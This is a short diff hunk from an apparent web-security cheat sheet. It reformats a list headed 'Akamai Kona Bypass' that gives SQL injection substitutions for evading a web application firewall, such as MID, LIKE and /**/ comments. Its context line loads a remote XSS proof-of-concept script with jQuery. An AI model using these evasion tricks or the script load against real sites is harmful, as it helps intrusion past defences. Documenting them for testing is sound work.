@@ -33,11 +33,11 @@ $.get('https://edwinfoudil.com/poc/jqueryxss.js')
 
 **Akamai Kona Bypass**
 
-`MID` instead of `SUBSTRING`
-`LIKE` instead of `=`
-`/**/` instead of a `space`
-`CURRENT_USER` instead of `CURRENT_USER()`
-` "` instead of `'`
+* `MID` instead of `SUBSTRING`
+* `LIKE` instead of `=`
+* `/**/` instead of a `space`
+* `CURRENT_USER` instead of `CURRENT_USER()`
+* ` "` instead of `'`
 
 Final example: 
 
